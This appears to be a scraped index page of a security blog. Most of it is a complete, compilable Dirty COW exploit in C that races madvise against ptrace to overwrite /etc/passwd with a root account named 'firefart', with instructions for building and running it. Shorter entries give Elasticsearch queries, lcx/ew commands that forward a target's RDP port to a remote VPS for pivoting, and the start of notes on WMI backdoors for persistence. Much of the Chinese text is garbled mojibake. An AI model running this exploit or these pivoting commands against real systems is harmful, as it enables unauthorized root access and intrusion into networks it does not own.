  printf(&quot;%s successfully backed up to %s\n&quot;,
    from, to);

  fclose(source);
  fclose(target);

  return 0;
&#125;

int main(int argc, char *argv[])
&#123;
  &#x2F;&#x2F; backup file
  int ret &#x3D; copy_file(filename, backup_filename);
  if (ret !&#x3D; 0) &#123;
    exit(ret);
  &#125;

  struct Userinfo user;
  &#x2F;&#x2F; set values, change as needed
  user.username &#x3D; &quot;firefart&quot;;
  user.user_id &#x3D; 0;
  user.group_id &#x3D; 0;
  user.info &#x3D; &quot;pwned&quot;;
  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;

  char *plaintext_pw;

  if (argc &gt;&#x3D; 2) &#123;
    plaintext_pw &#x3D; argv[1];
    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
  &#125; else &#123;
    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
  &#125;

  user.hash &#x3D; generate_password_hash(plaintext_pw);
  char *complete_passwd_line &#x3D; generate_passwd_line(user);
  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);

  f &#x3D; open(filename, O_RDONLY);
  fstat(f, &amp;st);
  map &#x3D; mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
  pid &#x3D; fork();
  if(pid) &#123;
    waitpid(pid, NULL, 0);
    int u, i, o, c &#x3D; 0;
    int l&#x3D;strlen(complete_passwd_line);
    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
      for(o &#x3D; 0; o &lt; l; o++) &#123;
        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
          c +&#x3D; ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        &#125;
      &#125;
    &#125;
    printf(&quot;ptrace %d\n&quot;,c);
  &#125;
  else &#123;
    pthread_create(&amp;pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  &#125;

  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
    user.username, plaintext_pw);
    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
    backup_filename, filename);
  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/09/12/c0w.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
<pre class="line-numbers language-none"><code class="language-none">Compile with:
&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
&#x2F;&#x2F;
&#x2F;&#x2F; Then run the newly create binary by either doing:
&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
&#x2F;&#x2F; as a base and automatically generates a new passwd line.
&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
&#x2F;&#x2F; and overwrites the root account with the generated line.
&#x2F;&#x2F; After running the exploit you should be able to login with the newly
&#x2F;&#x2F; created user.
&#x2F;&#x2F;
&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
&#x2F;&#x2F;   The default is &quot;firefart&quot;.
&#x2F;&#x2F;
&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
&#x2F;&#x2F;
&#x2F;&#x2F; Compile with:
&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
&#x2F;&#x2F;
&#x2F;&#x2F; Then run the newly create binary by either doing:
&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
&#x2F;&#x2F;
&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
&#x2F;&#x2F;

#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys&#x2F;mman.h&gt;
#include &lt;sys&#x2F;types.h&gt;
#include &lt;sys&#x2F;stat.h&gt;
#include &lt;sys&#x2F;wait.h&gt;
#include &lt;sys&#x2F;ptrace.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;crypt.h&gt;

const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
const char *salt &#x3D; &quot;firefart&quot;;

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo &#123;
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
&#125;;

char *generate_password_hash(char *plaintext_pw) &#123;
  return crypt(plaintext_pw, salt);
&#125;

char *generate_passwd_line(struct Userinfo u) &#123;
  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret &#x3D; malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
&#125;

void *madviseThread(void *arg) &#123;
  int i, c &#x3D; 0;
  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
  &#125;
  printf(&quot;madvise %d\n\n&quot;, c);
&#125;

int copy_file(const char *from, const char *to) &#123;
  &#x2F;&#x2F; check if target file already exists
  if(access(to, F_OK) !&#x3D; -1) &#123;
    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
      to);
    return -1;
  &#125;

  char ch;
  FILE *source, *target;

  source &#x3D; fopen(from, &quot;r&quot;);
  if(source &#x3D;&#x3D; NULL) &#123;
    return -1;
  &#125;
  target &#x3D; fopen(to, &quot;w&quot;);
  if(target &#x3D;&#x3D; NULL) &#123;
     fclose(source);
     return -1;
  &#125;

  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
     fputc(ch, target);
   &#125;

  printf(&quot;%s successfully backed up to %s\n&quot;,
    from, to);

  fclose(source);
  fclose(target);

  return 0;
&#125;

int main(int argc, char *argv[])
&#123;
  &#x2F;&#x2F; backup file
  int ret &#x3D; copy_file(filename, backup_filename);
  if (ret !&#x3D; 0) &#123;
    exit(ret);
  &#125;

  struct Userinfo user;
  &#x2F;&#x2F; set values, change as needed
  user.username &#x3D; &quot;firefart&quot;;
  user.user_id &#x3D; 0;
  user.group_id &#x3D; 0;
  user.info &#x3D; &quot;pwned&quot;;
  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;

  char *plaintext_pw;

  if (argc &gt;&#x3D; 2) &#123;
    plaintext_pw &#x3D; argv[1];
    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
  &#125; else &#123;
    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
  &#125;

  user.hash &#x3D; generate_password_hash(plaintext_pw);
  char *complete_passwd_line &#x3D; generate_passwd_line(user);
  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);

  f &#x3D; open(filename, O_RDONLY);
  fstat(f, &amp;st);
  map &#x3D; mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
  pid &#x3D; fork();
  if(pid) &#123;
    waitpid(pid, NULL, 0);
    int u, i, o, c &#x3D; 0;
    int l&#x3D;strlen(complete_passwd_line);
    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
      for(o &#x3D; 0; o &lt; l; o++) &#123;
        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
          c +&#x3D; ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        &#125;
      &#125;
    &#125;
    printf(&quot;ptrace %d\n&quot;,c);
  &#125;
  else &#123;
    pthread_create(&amp;pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  &#125;

  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
    user.username, plaintext_pw);
    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
    backup_filename, filename);
  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/09/12/c0w.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/08/15/elk_basic.html" >elkæ“ä½œç›¸å…³</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-08-15  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p> kibanaé‡Œé¢å¼€å§‹æ·»åŠ indexçš„æ—¶å€™ï¼Œå…ˆæŸ¥çœ‹esçš„ç´¢å¼•:</p>
<p> <code>curl &#39;localhost:9200/_cat/indices?v&#39;</code></p>
<p> ç„¶åæ·»åŠ çš„æ—¶å€™ç›´æ¥å†™ç´¢å¼•åå­—å°±è¡Œäº†ã€‚</p>
<p> åœ¨kibanaé‡Œé¢æ·»åŠ filter:</p>
<h3 id="æœç´¢è¿‘ä¸‰å¤©çš„æ•°æ®"><a href="#æœç´¢è¿‘ä¸‰å¤©çš„æ•°æ®" class="headerlink" title="æœç´¢è¿‘ä¸‰å¤©çš„æ•°æ®:"></a>æœç´¢è¿‘ä¸‰å¤©çš„æ•°æ®:</h3><pre class="line-numbers language-none"><code class="language-none"> 
 &#123;
  &quot;query&quot;: &#123;
    &quot;range&quot;: &#123;
      &quot;@timestamp&quot;: &#123;
        &quot;gt&quot;: &quot;now-3d&quot;
      &#125;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="æœç´¢æŸä¸€å¤©çš„æ•°æ®"><a href="#æœç´¢æŸä¸€å¤©çš„æ•°æ®" class="headerlink" title="æœç´¢æŸä¸€å¤©çš„æ•°æ®:"></a>æœç´¢æŸä¸€å¤©çš„æ•°æ®:</h3><pre class="line-numbers language-none"><code class="language-none"> 
&#123;
  &quot;query&quot;: &#123;
    &quot;range&quot;: &#123;
      &quot;@timestamp&quot;: &#123;
        &quot;gt&quot;: &quot;2017-08-15T01:00:00.900&quot;,
        &quot;lt&quot;: &quot;2017-08-15T23:59:00.900&quot;
      &#125;
    &#125;
  &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> åœ¨kibanaé‡Œé¢çš„Dev Toolså¯ä»¥ç›´æ¥æ“ä½œesæ•°æ®åº“:</p>
<h3 id="æŸ¥è¯¢æ•°æ®åº“æŸä¸€å¤©çš„æ•°æ®"><a href="#æŸ¥è¯¢æ•°æ®åº“æŸä¸€å¤©çš„æ•°æ®" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“æŸä¸€å¤©çš„æ•°æ®:"></a>æŸ¥è¯¢æ•°æ®åº“æŸä¸€å¤©çš„æ•°æ®:</h3>
	

	</div>
  <a type="button" href="/2017/08/15/elk_basic.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p> kibanaé‡Œé¢å¼€å§‹æ·»åŠ indexçš„æ—¶å€™ï¼Œå…ˆæŸ¥çœ‹esçš„ç´¢å¼•:</p>
<p> <code>curl &#39;localhost:9200/_cat/indices?v&#39;</code></p>
<p> ç„¶åæ·»åŠ çš„æ—¶å€™ç›´æ¥å†™ç´¢å¼•åå­—å°±è¡Œäº†ã€‚</p>
<p> åœ¨kibanaé‡Œé¢æ·»åŠ filter:</p>
<h3 id="æœç´¢è¿‘ä¸‰å¤©çš„æ•°æ®"><a href="#æœç´¢è¿‘ä¸‰å¤©çš„æ•°æ®" class="headerlink" title="æœç´¢è¿‘ä¸‰å¤©çš„æ•°æ®:"></a>æœç´¢è¿‘ä¸‰å¤©çš„æ•°æ®:</h3><pre class="line-numbers language-none"><code class="language-none"> 
 &#123;
  &quot;query&quot;: &#123;
    &quot;range&quot;: &#123;
      &quot;@timestamp&quot;: &#123;
        &quot;gt&quot;: &quot;now-3d&quot;
      &#125;
    &#125;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="æœç´¢æŸä¸€å¤©çš„æ•°æ®"><a href="#æœç´¢æŸä¸€å¤©çš„æ•°æ®" class="headerlink" title="æœç´¢æŸä¸€å¤©çš„æ•°æ®:"></a>æœç´¢æŸä¸€å¤©çš„æ•°æ®:</h3><pre class="line-numbers language-none"><code class="language-none"> 
&#123;
  &quot;query&quot;: &#123;
    &quot;range&quot;: &#123;
      &quot;@timestamp&quot;: &#123;
        &quot;gt&quot;: &quot;2017-08-15T01:00:00.900&quot;,
        &quot;lt&quot;: &quot;2017-08-15T23:59:00.900&quot;
      &#125;
    &#125;
  &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> åœ¨kibanaé‡Œé¢çš„Dev Toolså¯ä»¥ç›´æ¥æ“ä½œesæ•°æ®åº“:</p>
<h3 id="æŸ¥è¯¢æ•°æ®åº“æŸä¸€å¤©çš„æ•°æ®"><a href="#æŸ¥è¯¢æ•°æ®åº“æŸä¸€å¤©çš„æ•°æ®" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“æŸä¸€å¤©çš„æ•°æ®:"></a>æŸ¥è¯¢æ•°æ®åº“æŸä¸€å¤©çš„æ•°æ®:</h3>
	
	</div>
  <a type="button" href="/2017/08/15/elk_basic.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/08/12/ew-slave.html" >ewç«¯å£è½¬å‘ä¸SOCKS5ä»£ç†</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-08-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h3><p>é¦–å…ˆç¬¬ä¸€ç‚¹: ç«¯å£è½¬å‘å’Œsocksä»£ç†ä¸¤ä¸ªæ˜¯ä¸ä¸€æ ·çš„ä¸œè¥¿ã€‚</p>
<p>æ ¹æ®<a target="_blank" rel="noopener" href="http://rootkiter.com/2015/04/28/LCX_SOCKS.html">http://rootkiter.com/2015/04/28/LCX_SOCKS.html</a>é‡Œé¢æåˆ°çš„ç«¯å£è½¬å‘å·¥å…·æœ‰ä¸‰ç§å·¥ä½œçŠ¶æ€:</p>
<ul>
<li>slave å®¢æˆ·ç«¯æ¥å®¢æˆ·ç«¯      -slave ConnectHost ConnectPort TransmitHost TransmitPort </li>
<li>tran  æœåŠ¡ç«¯æ¥å®¢æˆ·ç«¯      -tran  ConnectPort TransmitHost TransmitPort</li>
<li>listen æœåŠ¡ç«¯æ¥æœåŠ¡ç«¯     -listen ConnectPort TransmitPort</li>
</ul>
<p>å†æ¥ä¸ªä¾‹å­<a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 &#x2F;&#x2F;ç›®æ ‡æœºå™¨çš„æ‰€æœ‰æ•°æ®è½¬å‘åˆ°å…¬ç½‘vpsçš„9000ç«¯å£
lcx.exe -listen 9000 5555   &#x2F;&#x2F;å°†æœ¬æœº9000ç«¯å£ç›‘å¬çš„æ•°æ®è½¬å‘åˆ°æœ¬æœº5555ç«¯å£
é€šè¿‡ä¸Šé—¨ä¸¤ä¸ªç«¯å£è½¬å‘ï¼Œå¯ä»¥ç™»é™†vpsä¸Šé¢çš„5555ç«¯å£ï¼Œæˆ–è€…vpsä¸Šé¢127.0.0.1çš„çš„5555ç«¯å£<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä¸¤ä¸ªå¯¹åº”çš„ewæ˜¯è¿™ä¹ˆå†™çš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">ew.exe -s lcx_slave -d 45.xx.xx.xx -e 9000 -f 127.0.0.1 -g 3389
.&#x2F;ew_for_linux64 -s lcx_listen -l 5555 -e 9000

ç¬¬ä¸€ä¸ªé¶æœºå¯ä»¥æŠ“å‘vpsè®¿é—®ä¸åˆ°çš„ipï¼Œæ¯”å¦‚linuxçš„22ç«¯å£ï¼Œä¹Ÿå°±æ˜¯æŠŠè¿™ä¸ªæœºå­ä½œä¸ºè·³æ¿ã€‚ 
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Socks5ä»£ç†"><a href="#Socks5ä»£ç†" class="headerlink" title="Socks5ä»£ç†"></a>Socks5ä»£ç†</h3><ul>
<li>å¦‚æœç›®æ ‡æœ‰å…¬ç½‘IP:</li>
</ul>
	

	</div>
  <a type="button" href="/2017/08/12/ew-slave.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h3><p>é¦–å…ˆç¬¬ä¸€ç‚¹: ç«¯å£è½¬å‘å’Œsocksä»£ç†ä¸¤ä¸ªæ˜¯ä¸ä¸€æ ·çš„ä¸œè¥¿ã€‚</p>
<p>æ ¹æ®<a target="_blank" rel="noopener" href="http://rootkiter.com/2015/04/28/LCX_SOCKS.html">http://rootkiter.com/2015/04/28/LCX_SOCKS.html</a>é‡Œé¢æåˆ°çš„ç«¯å£è½¬å‘å·¥å…·æœ‰ä¸‰ç§å·¥ä½œçŠ¶æ€:</p>
<ul>
<li>slave å®¢æˆ·ç«¯æ¥å®¢æˆ·ç«¯      -slave ConnectHost ConnectPort TransmitHost TransmitPort </li>
<li>tran  æœåŠ¡ç«¯æ¥å®¢æˆ·ç«¯      -tran  ConnectPort TransmitHost TransmitPort</li>
<li>listen æœåŠ¡ç«¯æ¥æœåŠ¡ç«¯     -listen ConnectPort TransmitPort</li>
</ul>
<p>å†æ¥ä¸ªä¾‹å­<a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 &#x2F;&#x2F;ç›®æ ‡æœºå™¨çš„æ‰€æœ‰æ•°æ®è½¬å‘åˆ°å…¬ç½‘vpsçš„9000ç«¯å£
lcx.exe -listen 9000 5555   &#x2F;&#x2F;å°†æœ¬æœº9000ç«¯å£ç›‘å¬çš„æ•°æ®è½¬å‘åˆ°æœ¬æœº5555ç«¯å£
é€šè¿‡ä¸Šé—¨ä¸¤ä¸ªç«¯å£è½¬å‘ï¼Œå¯ä»¥ç™»é™†vpsä¸Šé¢çš„5555ç«¯å£ï¼Œæˆ–è€…vpsä¸Šé¢127.0.0.1çš„çš„5555ç«¯å£<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä¸¤ä¸ªå¯¹åº”çš„ewæ˜¯è¿™ä¹ˆå†™çš„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">ew.exe -s lcx_slave -d 45.xx.xx.xx -e 9000 -f 127.0.0.1 -g 3389
.&#x2F;ew_for_linux64 -s lcx_listen -l 5555 -e 9000

ç¬¬ä¸€ä¸ªé¶æœºå¯ä»¥æŠ“å‘vpsè®¿é—®ä¸åˆ°çš„ipï¼Œæ¯”å¦‚linuxçš„22ç«¯å£ï¼Œä¹Ÿå°±æ˜¯æŠŠè¿™ä¸ªæœºå­ä½œä¸ºè·³æ¿ã€‚ 
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Socks5ä»£ç†"><a href="#Socks5ä»£ç†" class="headerlink" title="Socks5ä»£ç†"></a>Socks5ä»£ç†</h3><ul>
<li>å¦‚æœç›®æ ‡æœ‰å…¬ç½‘IP:</li>
</ul>
	
	</div>
  <a type="button" href="/2017/08/12/ew-slave.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/07/12/wmi.html" >WMIå­¦ä¹ ç¬”è®°</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-07-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="windowsä¸‹çš„å®šæ—¶ä»»åŠ¡"><a href="#windowsä¸‹çš„å®šæ—¶ä»»åŠ¡" class="headerlink" title="windowsä¸‹çš„å®šæ—¶ä»»åŠ¡"></a>windowsä¸‹çš„å®šæ—¶ä»»åŠ¡</h3><blockquote>
<p>ç»´æŒæƒé™çš„è¯è¿˜æ˜¯è€ƒè™‘WMIäº‹ä»¶æˆ–è€…åœ¨æœåŠ¡ä¸Šä¸‹æ‰‹.  å¦‚åŠ«æŒç›¸å…³æœåŠ¡æŒ‡å‘çš„ç¨‹åºï¼Œæœªè¢«åŒå¼•å·ä¿æŠ¤çš„è·¯å¾„ç­‰ï¼Œæ·»åŠ è®¡åˆ’ä»»åŠ¡ä¸€æ—¦è¢«æŠ¥è­¦.å°±æ˜¯æ•´ä¸ªå›¢é˜Ÿçš„ç¾éš¾</p>
</blockquote>
<h2 id="WMIåé—¨"><a href="#WMIåé—¨" class="headerlink" title="WMIåé—¨"></a>WMIåé—¨</h2><p>wmiçš„é€»è¾‘ç»“æ„æ˜¯è¿™æ ·çš„ï¼š<br>é¦–å…ˆæ˜¯wmiä½¿ç”¨è€…ï¼Œæ¯”å¦‚è„šæœ¬æˆ–è€…å…¶ä»–ç”¨åˆ°wmiæ¥å£çš„åº”ç”¨ç¨‹åºã€‚ç”±wmiä½¿ç”¨è€…è®¿é—®CIMå¯¹è±¡ç®¡ç†å™¨WinMgmtï¼ˆå³WMIæœåŠ¡ï¼‰ï¼Œåè€…å†è®¿é—®CIMï¼ˆå…¬å…±ä¿¡æ¯æ¨¡å‹Common Information Modelï¼‰å­˜å‚¨åº“ã€‚</p>
<p>é™æ€æˆ–åŠ¨æ€çš„ä¿¡æ¯ï¼ˆå¯¹è±¡çš„å±æ€§ï¼‰å°±ä¿å­˜åœ¨CIMåº“ä¸­ï¼ŒåŒæ—¶ä¿å­˜å¯¹è±¡çš„æ–¹æ³•ã€‚æ¯”å¦‚å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼Œé€šè¿‡æ‰§è¡Œå¯¹è±¡çš„æ–¹æ³•å®ç°ï¼Œå®é™…ä¸Šæ˜¯é€šè¿‡COMæŠ€æœ¯è°ƒç”¨å„ç§dllï¼Œæœ€åç”±dllä¸­å°è£…çš„APIå®Œæˆè¯·æ±‚ã€‚WMIæ˜¯äº‹ä»¶é©±åŠ¨çš„ï¼Œæ“ä½œç³»ç»Ÿã€æœåŠ¡ã€åº”ç”¨ç¨‹åºã€è®¾å¤‡é©±åŠ¨ç¨‹åºç­‰éƒ½å¯ä»¥ä½œä¸ºäº‹ä»¶æºï¼Œé€šè¿‡COMæ¥å£ç”Ÿæˆäº‹ä»¶é€šçŸ¥ï¼ŒWinMgmtæ•æ‰åˆ°äº‹ä»¶ï¼Œç„¶ååˆ·æ–°CIMåº“ä¸­çš„åŠ¨æ€ä¿¡æ¯ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆWMIæœåŠ¡ä¾èµ–äºEventLogçš„åŸå› ã€‚å°±åƒæ³¨å†Œè¡¨æœ‰æ ¹é”®ä¸€æ ·ï¼ŒCIMåº“ä¹Ÿæœ‰åˆ†ç±»ï¼Œç”¨é¢å‘å¯¹è±¡çš„æœ¯è¯­æè¿°æ¥æ¥è¯´ï¼Œå«åšå‘½åç©ºé—´(Name Spaceï¼‰</p>
